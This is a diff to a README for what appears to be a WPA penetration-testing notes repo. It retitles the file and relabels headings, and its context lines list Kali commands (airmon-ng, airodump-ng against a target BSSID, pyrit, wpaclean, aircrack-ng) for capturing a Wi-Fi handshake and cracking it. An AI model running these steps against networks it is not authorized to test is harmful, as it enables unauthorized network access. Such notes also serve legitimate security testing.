@@ -1,8 +1,8 @@
-# wifi-kali
+# wpa-pen-tools
 
-http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html
+Based on [this](http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html) howto
 
-## Extract handshake
+## Extract handshake (in kali)
 * airmon-ng start wlan0
 * airodump-ng wlan0mon
 * airodump-ng -c 1,1 --bssid {target_router_bssid} -w /mnt/mon0 wlan0mon
@@ -23,7 +23,7 @@ http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-ka
 * pyrit -u sqlite:///mydb.db -r *.cap attack_db
 
 ### hashcat
-#### in kali:
+#### Prepare outfile (in kali):
 * wpaclean out.cap mon0-01.cap
 * aircrack-ng out.cap -J out
 
